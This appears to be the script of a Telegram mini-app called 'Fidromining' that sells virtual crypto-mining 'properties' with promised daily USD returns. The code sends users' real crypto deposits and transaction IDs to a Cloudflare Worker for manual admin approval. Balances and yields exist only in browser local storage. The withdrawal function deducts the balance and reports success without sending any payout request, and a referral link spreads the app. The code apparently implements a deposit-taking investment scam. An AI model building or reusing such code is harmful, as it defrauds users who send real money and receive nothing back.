  <script>
    const WORKER_URL = "https://broken-grass-597c.awekezewuduu.workers.dev";
    
    // User detection
    let currentUserId = '8181751673';
    let currentUserHandle = '@Biilget';

    if (window.Telegram && window.Telegram.WebApp) {
      window.Telegram.WebApp.ready();
      window.Telegram.WebApp.expand();
      const tgUser = window.Telegram.WebApp.initDataUnsafe?.user;
      if (tgUser && tgUser.id) {
        currentUserId = String(tgUser.id);
        currentUserHandle = tgUser.username ? '@' + tgUser.username : (tgUser.first_name || 'User');
      }
    }

    document.getElementById('user-tg-id').innerText = currentUserId;
    document.getElementById('ref-link').value = `https://t.me/Fidromining_bot/app?startapp=${currentUserId}`;

    let balance = parseFloat(localStorage.getItem('fidro_bal_' + currentUserId)) || 0.50;
    let ownedProperties = JSON.parse(localStorage.getItem('fidro_props_' + currentUserId) || '[]');
    let pendingDepositAmt = parseFloat(localStorage.getItem('fidro_pending_amt_' + currentUserId)) || 0;
    let currentCoin = '';
    let currentMin = 1.00;

    updateUI();

    // Polling Admin Approval from Worker
    async function checkAdminApproval() {
      try {
        const res = await fetch(`${WORKER_URL}/status?uid=${currentUserId}`);
        const data = await res.json();
        const banner = document.getElementById('status-banner');

        if (data.status === 'pending') {
          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-amber-50 border-amber-200 text-amber-800 shadow-sm";
          banner.innerText = "⏳ Deposit Pending: Waiting for admin approval";
          banner.classList.remove('hidden');
        } else if (data.status === 'approved') {
          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-emerald-50 border-emerald-200 text-[#155E45] shadow-sm";
          banner.innerText = "✅ Deposit Confirmed & Credited!";
          banner.classList.remove('hidden');

          // Credit wallet only after admin clicks Confirm in Telegram
          if (pendingDepositAmt > 0) {
            balance += pendingDepositAmt;
            pendingDepositAmt = 0;
            localStorage.removeItem('fidro_pending_amt_' + currentUserId);
            saveData();
            updateUI();
          }
        } else if (data.status === 'rejected') {
          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-rose-50 border-rose-200 text-rose-800 shadow-sm";
          banner.innerText = "❌ Deposit Rejected (Invalid TXID)";
          banner.classList.remove('hidden');
          pendingDepositAmt = 0;
          localStorage.removeItem('fidro_pending_amt_' + currentUserId);
        } else {
          banner.classList.add('hidden');
        }
      } catch (e) {
        console.log("Sync error:", e);
      }
    }

    checkAdminApproval();
    setInterval(checkAdminApproval, 3000); // Check every 3 seconds

    function switchTab(tabId) {
      document.querySelectorAll('.tab-page').forEach(el => el.classList.add('hidden'));
      document.querySelectorAll('.nav-btn').forEach(el => {
        el.classList.remove('nav-active');
        el.classList.add('text-stone-400');
      });
      document.getElementById('tab-' + tabId).classList.remove('hidden');
      document.getElementById('btn-' + tabId).classList.add('nav-active');
      document.getElementById('btn-' + tabId).classList.remove('text-stone-400');
    }

    function showSubTab(type) {
      if(type === 'deposit-list') {
        document.getElementById('sub-deposit-list').classList.remove('hidden');
        document.getElementById('sub-withdraw-form').classList.add('hidden');
      } else {
        document.getElementById('sub-deposit-list').classList.add('hidden');
        document.getElementById('sub-withdraw-form').classList.remove('hidden');
      }
    }

    function buyProperty(name, price, dailyYield) {
      if (balance < price) {
        alert("Insufficient balance! Please deposit funds in your wallet.");
        switchTab('wallet');
        return;
      }
      balance -= price;
      ownedProperties.push({ name, dailyYield });
      saveData();
      updateUI();
      alert(`Success! ${name} is now actively producing daily yields.`);
    }

    function updateUI() {
      document.getElementById('header-balance').innerHTML = `${balance.toFixed(2)} <span class="text-[9px] text-stone-500">USD</span>`;
      document.getElementById('wallet-balance').innerHTML = `${balance.toFixed(2)} <span class="text-base font-medium">USD</span>`;
      
      let totalDaily = ownedProperties.reduce((sum, r) => sum + r.dailyYield, 0);
      let totalMonthly = totalDaily * 30;

      document.getElementById('dash-rigs').innerHTML = `${ownedProperties.length} <span class="text-[10px] text-stone-400 font-normal">/ 10</span>`;
      document.getElementById('dash-daily').innerHTML = totalDaily.toFixed(2) + ' <span class="text-[9px] text-stone-500">USD</span>';

      document.getElementById('active-rigs-count').innerText = ownedProperties.length;
      document.getElementById('daily-profit').innerHTML = totalDaily.toFixed(2) + ' <span class="text-xs text-stone-500">USD</span>';
      document.getElementById('monthly-profit').innerHTML = totalMonthly.toFixed(2) + ' <span class="text-xs text-stone-500">USD</span>';
    }

    function saveData() {
      localStorage.setItem('fidro_bal_' + currentUserId, balance);
      localStorage.setItem('fidro_props_' + currentUserId, JSON.stringify(ownedProperties));
    }

    function openDepositModal(coin, min, addr) {
      currentCoin = coin;
      currentMin = parseFloat(min);
      document.getElementById('modal-coin-title').innerText = 'Deposit ' + coin;
      document.getElementById('modal-min-amount').innerText = 'Min deposit: ' + min + ' USD';
      document.getElementById('modal-address').innerText = addr;
      document.getElementById('deposit-tx-amount').value = '';
      document.getElementById('deposit-txid').value = '';
      document.getElementById('deposit-modal').classList.remove('hidden');
      document.getElementById('deposit-modal').classList.add('flex');
    }

    function closeModal() {
      document.getElementById('deposit-modal').classList.add('hidden');
      document.getElementById('deposit-modal').classList.remove('flex');
    }

    function copyDepositAddress() {
      const addr = document.getElementById('modal-address').innerText;
      navigator.clipboard.writeText(addr);
      alert("Deposit address copied!");
    }

    // Submit Proof: Stays Pending until YOU confirm in Telegram
    async function submitDepositProof() {
      const amount = parseFloat(document.getElementById('deposit-tx-amount').value);
      const txid = document.getElementById('deposit-txid').value.trim();

      if (isNaN(amount) || amount < currentMin) {
        alert(`Minimum deposit is ${currentMin} USD.`);
        return;
      }
      if (!txid) {
        alert("Please paste your transaction hash/TXID.");
        return;
      }

      const btn = document.getElementById('btn-submit-proof');
      btn.innerText = "Submitting...";
      btn.disabled = true;

      try {
        await fetch(`${WORKER_URL}/submit-deposit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            username: currentUserHandle,
            coin: currentCoin,
            amount: amount,
            txid: txid
          })
        });

        // Store the amount as pending (NOT added to balance yet!)
        pendingDepositAmt = amount;
        localStorage.setItem('fidro_pending_amt_' + currentUserId, pendingDepositAmt);

        alert("Deposit submitted! Waiting for admin confirmation.");
        closeModal();
        checkAdminApproval();
      } catch (err) {
        alert("Error submitting. Please try again.");
      } finally {
        btn.innerText = "Confirm Deposit";
        btn.disabled = false;
      }
    }

    function submitWithdraw() {
      const amount = parseFloat(document.getElementById('withdraw-amount').value);
      const addr = document.getElementById('withdraw-address').value.trim();

      if (!addr) return alert("Please enter payout address.");
      if (isNaN(amount) || amount < 1.00) return alert("Minimum withdrawal is 1.00 USD.");
      if (amount > balance) return alert("Insufficient balance.");

      balance -= amount;
      saveData();
      updateUI();
      alert("Withdrawal submitted!");
      document.getElementById('withdraw-amount').value = '';
      document.getElementById('withdraw-address').value = '';
    }

    function copyRefLink() {
      const link = document.getElementById('ref-link');
      link.select();
      navigator.clipboard.writeText(link.value);
      alert("Referral link copied!");
    }
  </script>
</body>
</html>
